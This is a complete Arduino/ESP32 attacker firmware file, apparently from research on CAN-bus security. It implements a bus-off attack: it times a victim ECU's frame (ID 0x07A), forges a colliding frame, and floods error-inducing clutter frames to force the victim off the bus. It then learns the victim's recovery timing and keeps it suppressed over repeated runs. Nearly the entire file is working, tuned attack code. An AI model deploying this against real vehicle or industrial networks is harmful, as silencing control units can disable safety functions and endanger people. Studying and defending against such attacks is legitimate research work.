// attacker.ino — SFBO + Persistent Bus-Off (PBO) attacker node
//
// Implements the timing-critical core of the Scan-Then-Strike attack on an
// ESP32-C3 (ESP-IDF TWAI). State machine:
//   IDLE -> MEASURE -> LEARN -> PERSIST -> DONE
//   - MEASURE: passively time the victim's TARGET_ID frame and lock its payload signature.
//   - LEARN:   launch SFBO repeatedly, record the post-bus-off recovery interval,
//              until LEARN_PHASES successful bus-offs are collected; take the median.
//   - PERSIST: keep the victim suppressed using one of two strategies (USE_FIXED_ATTACK).
// Progress is mirrored on the bus via 8-byte report frames (REPORT_ID) for the PC logger.

#include <ESP32-TWAI-CAN.hpp>
#include "driver/twai.h"

// ---------- Pins & IDs ----------
#define CAN_TX 4
#define CAN_RX 5
#define HEARTBEAT_PIN 8

#define TARGET_ID 0x07A    // victim ID we attack (its "optimum ID")
#define PRECEDED_ID 0x001  // high-priority sync frame sent just before the victim's slot
#define CLUTTER_ID 0x777   // arbitrary ID used to regenerate passive error frames
#define TRIGGER_ID 0x600   // PC -> attacker: start the run
#define REPORT_ID 0x601    // attacker -> PC: progress report

// ---------- Attack timing ----------
#define ATTACK_ADVANCE_US 235  // fire the preceded frame this long before the expected victim slot
                               // (~one 8-byte frame time; absorbs TWAI TX-queue latency)
#define N_PRECEDED_LEARN 1     // preceded frames per SFBO during LEARN (fresh anchor => 1 is enough)
#define CLUTTER_GAP_US 30      // spacing between clutter frames
#define N_CLUTTER 15           // clutter count: TEC = 136 + 8*N reaches bus-off at N=15
#define BEF_CLUTTER_US 100     // delay between the forged collision frame and the clutter burst

// ---------- Measurement & Learning ----------
#define N_SAMPLES 256
#define LEARN_PHASES 30           // successful bus-offs to collect before computing the median
#define MAX_ATTEMPTS_PER_LEARN 2  // misses tolerated per phase before re-measuring

#define RECOVERY_WAIT_MS 2500  // upper bound on waiting for the recovery frame (clamp, not timing)
#define BUSOFF_GAP_US 13000    // if no victim frame within this window after an attack => bus-off

#define CONTINUE_DELAY_MS 50     // settle delay after a successful learn bus-off
#define BETWEEN_ATTEMPTS_MS 150  // back-off between learn attempts

// ---------- Persistence ----------
#define PERSIST_LEAD_US 725  // launch the blind attack this long before the predicted recovery (fixed mode)
#define PERSIST_TARGET 20    // consecutive bus-offs that count as a sustained chain
#define N_PRECEDED_BLIND 11  // wider preceded train (~1 ms) to bracket the predicted recovery (fixed mode)
#define MAX_RESTARTS 5       // restarts allowed per run before declaring it failed
#define TOTAL_RUNS 30        // independent persistence runs

#define RESET_AFTER_EVERY_ATTACK true  // full controller reinit after each attack (reliability workaround)
#define USE_FIXED_ATTACK true          // true  = fixed/sequenced recovery: predict timing (open-loop)
                                       // false = random recovery: wait for recovery frame, hit trailing (closed-loop)

typedef enum {
  STATE_IDLE,
  STATE_MEASURE,
  STATE_LEARN,
  STATE_RESET,
  STATE_PERSIST,
  STATE_DONE
} AttackState;

static volatile AttackState gState = STATE_IDLE;

static uint32_t gPeriodUs = 0;
static uint32_t gTotalAttempts = 0;
static uint32_t gSuccessfulBusOffsLearn = 0;
static uint32_t gPhaseAttempts = 0;

// Victim payload signature, learned in MEASURE and used to reject look-alike frames.
static uint8_t gVictimDlc = 0;
static uint8_t gVictimData[8] = { 0 };
static bool gVictimSignatureKnown = false;

// Recovery intervals (us) collected during LEARN; median is the recovery estimate.
static uint32_t gRecoverySamplesUs[LEARN_PHASES] = { 0 };
static uint32_t gRecoveryCount = 0;
static uint32_t gRecoveryMedianUs = 0;

static uint32_t gPersistBusOffs = 0;  // bus-offs in the current run
static uint32_t gRestartCount = 0;
static uint32_t gRunCount = 0;

// ================================================================
//  Low-level helpers
// ================================================================

// Queue a frame through the high-level driver (used for the preceded/forged frames).
static void txFrame(uint32_t id, uint8_t dlc, const uint8_t *data) {
  CanFrame f = { 0 };
  f.identifier = id;
  f.extd = 0;
  f.data_length_code = dlc;
  if (data && dlc > 0) memcpy(f.data, data, dlc);
  ESP32Can.writeFrame(f);
}

// Queue a 1-byte frame directly via the IDF API (lower overhead for the clutter burst).
static void txFrameDirect(uint32_t id, uint8_t dlc, uint8_t byte0) {
  twai_message_t m = { 0 };
  m.identifier = id;
  m.extd = 0;
  m.data_length_code = dlc;
  m.data[0] = byte0;
  twai_transmit(&m, pdMS_TO_TICKS(1));
}

// Busy-wait up to timeout_us for any frame with the given 11-bit ID.
static bool waitForId(uint32_t target_id, uint32_t timeout_us, CanFrame *out) {
  uint64_t start = esp_timer_get_time();
  CanFrame rx;
  while ((esp_timer_get_time() - start) < timeout_us) {
    if (ESP32Can.readFrame(rx, 0)) {
      if ((rx.identifier & 0x7FF) == target_id) {
        if (out) *out = rx;
        return true;
      }
    }
  }
  return false;
}

// True only for the genuine victim frame: matching ID and (once known) DLC + payload.
// Before the signature is learned, any TARGET_ID frame qualifies.
static bool isVictimFrame(const CanFrame &f) {
  if ((f.identifier & 0x7FF) != TARGET_ID) return false;
  if (!gVictimSignatureKnown) return true;
  if (f.data_length_code != gVictimDlc) return false;
  return memcmp(f.data, gVictimData, gVictimDlc) == 0;
}

// Busy-wait up to timeout_us for a genuine victim frame.
static bool waitForVictimFrame(uint32_t timeout_us, CanFrame *out) {
  uint64_t start = esp_timer_get_time();
  CanFrame rx;
  while ((esp_timer_get_time() - start) < timeout_us) {
    if (ESP32Can.readFrame(rx, 0)) {
      if (isVictimFrame(rx)) {
        if (out) *out = rx;
        return true;
      }
    }
  }
  return false;
}

// Same as above but with a coarse millisecond timeout, for the long recovery wait.
static bool waitForVictimFrameMs(uint32_t timeout_ms, CanFrame *out) {
  uint32_t elapsed = 0;
  CanFrame rx;
  while (elapsed < timeout_ms) {
    uint64_t window = esp_timer_get_time();
    while ((esp_timer_get_time() - window) < 1000ULL) {
      if (ESP32Can.readFrame(rx, 0)) {
        if (isVictimFrame(rx)) {
          if (out) *out = rx;
          return true;
        }
      }
    }
    vTaskDelay(pdMS_TO_TICKS(1));
    elapsed++;
  }
  return false;
}

static int u32cmp(const void *a, const void *b) {
  uint32_t ua = *(const uint32_t *)a;
  uint32_t ub = *(const uint32_t *)b;
  return (ua > ub) - (ua < ub);
}

static uint32_t computeRecoveryMedianUs() {
  if (gRecoveryCount == 0) return 0;
  uint32_t tmp[LEARN_PHASES];
  for (uint32_t i = 0; i < gRecoveryCount; i++) tmp[i] = gRecoverySamplesUs[i];
  qsort(tmp, gRecoveryCount, sizeof(uint32_t), u32cmp);
  return tmp[gRecoveryCount / 2];
}

// Emit a progress report (layout must match pc_logger's parser).
static void sendReport(uint8_t state) {
  uint8_t d[8] = {
    (uint8_t)(gTotalAttempts & 0xFF),
    (uint8_t)(gTotalAttempts >> 8),
    (uint8_t)(gSuccessfulBusOffsLearn & 0xFF),
    (uint8_t)(gSuccessfulBusOffsLearn >> 8),
    state,                                     // d[4]: 0x01 LEARN / 0x02 PERSIST / 0x03 DONE
    (uint8_t)(gPersistBusOffs & 0xFF),         // d[5]
    (uint8_t)((gPersistBusOffs >> 8) & 0xFF),  // d[6]
    (uint8_t)(gRunCount & 0xFF)                // d[7]
  };
  txFrame(REPORT_ID, 8, d);
}

// Full controller teardown + re-init. Needed because the TWAI peripheral can latch
// up after a heavy error burst and stop transmitting; costs ~25-30 ms of dead time.
static void resetCANController() {
  Serial.println("[RESET] resetting CAN controller...");
  ESP32Can.end();
  vTaskDelay(pdMS_TO_TICKS(25));

  twai_filter_config_t fCfg = TWAI_FILTER_CONFIG_ACCEPT_ALL();
  if (!ESP32Can.begin(ESP32Can.convertSpeed(500), CAN_TX, CAN_RX,
                      9, 64, &fCfg, nullptr, nullptr)) {
    Serial.println("[RESET] CAN re-init FAILED");
  } else {
    Serial.println("[RESET] CAN re-init OK");
  }
  twai_reconfigure_alerts(
    TWAI_ALERT_BUS_OFF | TWAI_ALERT_BUS_RECOVERED | TWAI_ALERT_ERR_PASS | TWAI_ALERT_TX_FAILED,
    nullptr);
}

// ================================================================
//  Measurement
// ================================================================

// Learn the victim's signature, then average N_SAMPLES inter-arrival times to get the period.
static uint32_t measurePeriod() {
  Serial.printf("[MEASURE] collecting %d samples for 0x%03X...\n", N_SAMPLES, TARGET_ID);
  CanFrame rx;
  while (!waitForId(TARGET_ID, 2000000, &rx)) {
    Serial.println("[MEASURE] waiting for first frame...");
  }
  gVictimDlc = rx.data_length_code;
  memcpy(gVictimData, rx.data, gVictimDlc);
  gVictimSignatureKnown = true;

  Serial.printf("[MEASURE] victim signature dlc=%u data=", gVictimDlc);
  for (uint8_t i = 0; i < gVictimDlc; i++) Serial.printf("%02X ", gVictimData[i]);
  Serial.println();

  // Discard two frames so the first measured interval is clean.
  waitForVictimFrame(500000, &rx);
  waitForVictimFrame(500000, &rx);

  uint64_t prev = esp_timer_get_time();
  uint64_t sum = 0;
  uint32_t good = 0;

  for (int i = 0; i < N_SAMPLES; i++) {
    if (waitForVictimFrame(500000, &rx)) {
      uint64_t now = esp_timer_get_time();
      uint64_t d = now - prev;
      if (d > 1000 && d < 500000) {  // reject outliers (missed/duplicate frames)
        sum += d;
        good++;
      }
      prev = now;
    }
    if ((i & 63) == 0) Serial.printf("[MEASURE] %d/%d\n", i, N_SAMPLES);
  }
  uint32_t avg = (good > 0) ? (uint32_t)(sum / good) : 0;
  Serial.printf("[MEASURE] avg=%u us good=%u\n", avg, good);
  return avg;
}

// ================================================================
//  SFBO attack primitives
// ================================================================

// One SFBO instance, anchored on a freshly observed victim frame:
//  1) sleep until ATTACK_ADVANCE_US before the next expected slot;
//  2) send the preceded (sync) frame so the victim and our forgery start together;
//  3) send the same-ID forgery (00 00 00) which wins the data-field arbitration -> bit error;
//  4) burst clutter frames to regenerate passive errors and drive TEC to 256 (bus-off).
static void doSFBOAttack(uint32_t period_us) {
  int64_t sl = (int64_t)period_us - ATTACK_ADVANCE_US;
  if (sl < 0) sl = 0;
  esp_rom_delay_us((uint32_t)sl);

  static const uint8_t payload[8] = { 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01 };

  for (int i = 0; i < N_PRECEDED_LEARN; i++) {
    txFrame(PRECEDED_ID, 8, payload);  // 8-byte preceded frame (~244 us on the bus)
  }
  esp_rom_delay_us(10);

  static const uint8_t zeros[3] = { 0, 0, 0 };
  txFrame(TARGET_ID, 3, zeros);  // forged victim frame, higher-priority content
  esp_rom_delay_us(BEF_CLUTTER_US);

  for (int i = 0; i < N_CLUTTER; i++) {
    txFrameDirect(CLUTTER_ID, 1, 0xFF);
    esp_rom_delay_us(CLUTTER_GAP_US);
  }
}

// Blind SFBO for fixed-mode persistence: same primitive but a wider preceded train and
// no fresh anchor. Returns a timestamp just before the final clutter frame, used as the
// timing anchor for predicting the next recovery instant.
static int64_t blindSFBO() {
  static const uint8_t payload[8] = { 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01 };

  for (int i = 0; i < N_PRECEDED_BLIND; i++) {
    txFrame(PRECEDED_ID, 8, payload);
  }
  esp_rom_delay_us(10);
  static const uint8_t zeros[3] = { 0, 0, 0 };
  txFrame(TARGET_ID, 3, zeros);
  esp_rom_delay_us(BEF_CLUTTER_US);
  for (int i = 0; i < N_CLUTTER - 1; i++) {
    txFrameDirect(CLUTTER_ID, 1, 0xFF);
    esp_rom_delay_us(CLUTTER_GAP_US);
  }
  int64_t anchor = esp_timer_get_time();  // anchor captured just before the last frame
  txFrameDirect(CLUTTER_ID, 1, 0xFF);
  return anchor;
}

// One learning attempt: anchor on a victim frame, attack, then time the recovery.
// Bus-off is inferred from the absence of a victim frame within BUSOFF_GAP_US.
// Returns true and writes the recovery interval (us) on success.
static bool sfboAttempt(uint32_t period_us, uint32_t *recovery_us_out) {
  CanFrame rx;
  if (!waitForVictimFrame(period_us * 6, &rx)) {
    Serial.println("[SFBO] timeout waiting victim");
    if (RESET_AFTER_EVERY_ATTACK) {
      resetCANController();
      vTaskDelay(pdMS_TO_TICKS(5));
    }
    return false;
  }
  doSFBOAttack(period_us);
  uint64_t intime = esp_timer_get_time();

  if (RESET_AFTER_EVERY_ATTACK) {
    resetCANController();
    vTaskDelay(pdMS_TO_TICKS(5));
  }

  if (!waitForVictimFrame(BUSOFF_GAP_US, &rx)) {  // silence => bus-off achieved
    uint32_t rec_us = 0;
    if (waitForVictimFrameMs(RECOVERY_WAIT_MS, &rx)) {
      uint64_t outtime = esp_timer_get_time();
      rec_us = (uint32_t)(outtime - intime);  // recovery = attack -> first frame back
    } else {
      rec_us = RECOVERY_WAIT_MS * 1000UL;  // clamp if recovery never observed
    }
    if (recovery_us_out) *recovery_us_out = rec_us;
    Serial.printf("[SFBO] *** BUS-OFF *** recovery=%u us\n", rec_us);
    return true;
  }
  Serial.printf("[SFBO] miss\n");
  return false;
}

// ================================================================
//  Main attack task
// ================================================================
void attackTask(void *arg) {
  Serial.println("[TASK] ready - send 0x600 to start");
  CanFrame rx;
  bool success = false;  // true when re-entering MEASURE after a successful learn bus-off

  for (;;) {
    switch (gState) {

      case STATE_IDLE:
        if (waitForId(TRIGGER_ID, 200000, &rx)) {
          Serial.println("[TASK] triggered");
          gTotalAttempts = 0;
          gSuccessfulBusOffsLearn = 0;
          gPhaseAttempts = 0;
          gVictimSignatureKnown = false;
          gVictimDlc = 0;
          memset(gVictimData, 0, sizeof(gVictimData));
          gPeriodUs = 0;
          gRecoveryCount = 0;
          gRecoveryMedianUs = 0;
          memset(gRecoverySamplesUs, 0, sizeof(gRecoverySamplesUs));
          gPersistBusOffs = 0;
          gRestartCount = 0;
          gRunCount = 0;
          gState = STATE_MEASURE;
        }
        break;

      case STATE_MEASURE:
        gVictimSignatureKnown = false;
        if (success) {
          // Re-entry after a learn bus-off: the period is already known, just resync
          // onto a few fresh victim frames instead of re-running the full measurement.
          waitForVictimFrame(2000000, &rx);
          waitForVictimFrame(2000000, &rx);
          waitForVictimFrame(2000000, &rx);
        } else {
          gPeriodUs = measurePeriod();
        }
        if (gPeriodUs < 1000 || gPeriodUs > 500000) {
          Serial.printf("[TASK] bad period %u us\n", gPeriodUs);
          vTaskDelay(pdMS_TO_TICKS(200));
        } else {
          Serial.printf("[TASK] period=%u us - LEARNING (need %d successful bus-offs)\n",
                        gPeriodUs, LEARN_PHASES);
          gState = STATE_LEARN;
        }
        break;

      case STATE_LEARN:
        {
          success = false;
          gTotalAttempts++;
          gPhaseAttempts++;
          sendReport(0x01);
          Serial.printf("[LEARN] phase %u/%d, attempt %u/%d\n",
                        gSuccessfulBusOffsLearn + 1, LEARN_PHASES,
                        gPhaseAttempts, MAX_ATTEMPTS_PER_LEARN);
          uint32_t rec_us = 0;
          if (sfboAttempt(gPeriodUs, &rec_us)) {
            gSuccessfulBusOffsLearn++;
            if (gRecoveryCount < LEARN_PHASES)
              gRecoverySamplesUs[gRecoveryCount++] = rec_us;
            if (gSuccessfulBusOffsLearn >= LEARN_PHASES) {
              gRecoveryMedianUs = computeRecoveryMedianUs();
              Serial.printf("[TASK] LEARN DONE: median recovery=%u us\n", gRecoveryMedianUs);
              gState = STATE_PERSIST;
            } else {
              // Reset and re-sync before the next phase to stay aligned with the victim.
              Serial.println("[LEARN] bus-off detected, going to RESET state...");
              vTaskDelay(pdMS_TO_TICKS(CONTINUE_DELAY_MS));
              gState = STATE_RESET;
              success = true;
            }
          } else {
            if (gPhaseAttempts >= MAX_ATTEMPTS_PER_LEARN) {
              // Two misses in a row: realign from scratch (controller may have drifted).
              Serial.printf("[LEARN] exceeded %d attempts, resetting phase...\n", MAX_ATTEMPTS_PER_LEARN);
              vTaskDelay(pdMS_TO_TICKS(BETWEEN_ATTEMPTS_MS));
              gState = STATE_RESET;
              success = false;
            } else {
              Serial.println("[LEARN] slowing down before next attempt...");
              vTaskDelay(pdMS_TO_TICKS(BETWEEN_ATTEMPTS_MS));
            }
          }
          break;
        }

      case STATE_RESET:
        resetCANController();
        gPhaseAttempts = 0;
        gState = STATE_MEASURE;
        break;

      case STATE_PERSIST:
        {
          sendReport(0x02);
          Serial.printf("[PERSIST] starting %u runs (target %u bus-offs, median=%u us, mode=%s)\n",
                        TOTAL_RUNS, PERSIST_TARGET, gRecoveryMedianUs,
                        USE_FIXED_ATTACK ? "FIXED" : "RANDOM/trailing");

          // Repeat the whole persistence attempt TOTAL_RUNS times for statistics.
          while (gRunCount < TOTAL_RUNS && gState == STATE_PERSIST) {
            Serial.printf("\n[PERSIST] ===== Run %u/%u =====\n", gRunCount + 1, TOTAL_RUNS);
            gRestartCount = 0;
            gPersistBusOffs = 0;

            resetCANController();
            vTaskDelay(pdMS_TO_TICKS(5));

            // Retry the chain until it reaches PERSIST_TARGET or the restart budget runs out.
            while (gRestartCount < MAX_RESTARTS && gState == STATE_PERSIST) {

              // ---- 1. Obtain the initial bus-off (observed SFBO) ----
              bool got_busoff = false;
              while (!got_busoff) {
                if (!waitForVictimFrame(gPeriodUs * 6, &rx)) {
                  Serial.println("[PERSIST] waiting for victim frame...");
                  continue;
                }
                doSFBOAttack(gPeriodUs);
                uint64_t t_attack_end = esp_timer_get_time();  // anchor for fixed-mode prediction

                if (RESET_AFTER_EVERY_ATTACK) {
                  resetCANController();
                }
                // After reinit our own controller may itself be bus-off; recover it so we can keep attacking.
                twai_status_info_t stat;
                twai_get_status_info(&stat);
                if (stat.state == TWAI_STATE_BUS_OFF) {
                  twai_initiate_recovery();
                  esp_rom_delay_us(5000);
                  twai_start();
                  esp_rom_delay_us(500);
                }

                if (waitForVictimFrame(BUSOFF_GAP_US, &rx)) {
                  Serial.println("[PERSIST] initial bus-off miss, retrying...");
                } else {
                  got_busoff = true;
                  gPersistBusOffs = 1;
                  Serial.printf("[PERSIST] initial bus-off succeeded (count=1)\n");

                  // ---- 2. Keep re-attacking each recovery until PERSIST_TARGET ----
                  while (gPersistBusOffs < PERSIST_TARGET && gState == STATE_PERSIST) {
                    bool hit = false;
                    sendReport(0x02);

                    if (USE_FIXED_ATTACK) {
                      // Open-loop: predict the recovery instant from the learned median and
                      // fire blind, leading it by ATTACK_ADVANCE_US + PERSIST_LEAD_US.
                      // No re-observation => per-cycle error accumulates.
                      uint64_t target_time = t_attack_end + (uint64_t)gRecoveryMedianUs
                                             - ATTACK_ADVANCE_US - PERSIST_LEAD_US;
                      int64_t sleep_us = (int64_t)target_time - (int64_t)esp_timer_get_time();
                      if (sleep_us > 3000) {
                        vTaskDelay(pdMS_TO_TICKS((sleep_us - 3000) / 1000));  // coarse sleep
                      }
                      while ((int64_t)esp_timer_get_time() < (int64_t)target_time) {}  // fine spin

                      t_attack_end = blindSFBO();

                      if (RESET_AFTER_EVERY_ATTACK) {
                        resetCANController();
                      }
                      hit = !waitForVictimFrame(BUSOFF_GAP_US, &rx);

                    } else {
                      // Closed-loop: wait for the leaked recovery frame, then attack the
                      // trailing frame one period later. Re-anchors every cycle => no drift.
                      if (!waitForVictimFrame(gPeriodUs * 20, &rx)) {
                        Serial.println("[PERSIST] timeout waiting for recovery, restarting...");
                        gRestartCount++;
                        gPersistBusOffs = 0;
                        break;
                      }
                      Serial.println("[PERSIST] recovery detected, attacking trailing frame");
                      // doSFBOAttack waits (period - ATTACK_ADVANCE_US), so it lines up with
                      // the next TARGET_ID instance (the trailing message).
                      doSFBOAttack(gPeriodUs);
                      t_attack_end = esp_timer_get_time();

                      if (RESET_AFTER_EVERY_ATTACK) {
                        resetCANController();
                      }
                      hit = !waitForVictimFrame(BUSOFF_GAP_US, &rx);
                    }

                    if (hit) {
                      gPersistBusOffs++;
                      Serial.printf("[PERSIST] bus-off #%u\n", gPersistBusOffs);
                    } else {
                      // Chain broke: spend a restart and re-acquire from the initial bus-off.
                      Serial.printf("[PERSIST] miss at count %u, restarting...\n", gPersistBusOffs);
                      gRestartCount++;
                      gPersistBusOffs = 0;
                      break;
                    }
                  }
                }
              }  // end while(!got_busoff)

              if (gPersistBusOffs >= PERSIST_TARGET) {
                Serial.printf("[PERSIST] run %u completed (reached %u bus-offs)\n",
                              gRunCount + 1, PERSIST_TARGET);
                break;
              }
            }  // end restart loop

            if (gPersistBusOffs < PERSIST_TARGET) {
              Serial.printf("[PERSIST] run %u failed (max restarts reached)\n", gRunCount + 1);
            }

            gRunCount++;
            vTaskDelay(pdMS_TO_TICKS(500));  // idle gap between runs
          }  // end run loop

          if (gRunCount >= TOTAL_RUNS) {
            Serial.printf("[PERSIST] all %u runs completed\n", TOTAL_RUNS);
            gState = STATE_DONE;
          }
          break;
        }

      case STATE_DONE:
        sendReport(0x03);
        Serial.printf("[TASK] DONE learn=%u persistBusOffs=%u totalRuns=%u medianRecovery=%u us\n",
                      gSuccessfulBusOffsLearn, gPersistBusOffs, gRunCount, gRecoveryMedianUs);
        vTaskDelay(pdMS_TO_TICKS(5000));
        gState = STATE_IDLE;
        break;
    }
  }
}

// ================================================================
//  Arduino setup & loop
// ================================================================
void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n=== SFBO + PERSISTENT BUS-OFF (PBO) ===");

  pinMode(HEARTBEAT_PIN, OUTPUT);
  digitalWrite(HEARTBEAT_PIN, HIGH);  // power-on indicator

  twai_filter_config_t fCfg = TWAI_FILTER_CONFIG_ACCEPT_ALL();
  if (!ESP32Can.begin(ESP32Can.convertSpeed(500), CAN_TX, CAN_RX,
                      9, 64, &fCfg, nullptr, nullptr)) {
    Serial.println("[SETUP] CAN FAILED");
    digitalWrite(HEARTBEAT_PIN, LOW);
    while (1) delay(1000);
  }
  twai_reconfigure_alerts(
    TWAI_ALERT_BUS_OFF | TWAI_ALERT_BUS_RECOVERED | TWAI_ALERT_ERR_PASS | TWAI_ALERT_TX_FAILED, nullptr);
  Serial.println("[SETUP] CAN OK - send 0x600 to start");

  xTaskCreate(attackTask, "ATK", 16384, NULL, 3, NULL);
}

void loop() {
  delay(10000000);  // all work happens in attackTask
}
